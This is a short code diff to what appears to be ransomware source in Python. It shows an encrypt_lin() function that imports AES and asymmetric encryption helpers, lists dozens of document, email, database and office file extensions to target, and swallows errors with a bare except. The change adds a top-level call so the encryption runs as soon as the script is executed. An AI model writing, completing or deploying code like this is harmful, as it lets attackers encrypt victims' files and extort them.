@@ -2,7 +2,7 @@ import os
 import base64
 from aes_encryption import aes_encrypt
 import asymmetric as Rencrypt
-
+import sys
 def encrypt_lin():
     file_format = {'.DOC': 0, '.DOCX': 0, '.XLS': 0, '.XLSX': 0, '.PPT': 0, '.PPTX': 0, '.PST': 0, '.OST': 0, '.MSG': 0, '.EML': 0, '.VSD\
 ': 0, '.VSDX': 0, '.TXT': 0, '.CSV': 0, '.RTF': 0, '.WKS': 0, '.WK1': 0, '.PDF': 0, '.DWG': 0, '.ONETOC2': 0, '.SNT': 0
@@ -34,3 +34,4 @@ AM': 0, '.POTX': 0, '.POTM': 0, '.EDB': 0, '.HWP': 0, '.602': 0, '.SXI': 0, '.ST
     except:
         pass
 
+encrypt_lin()
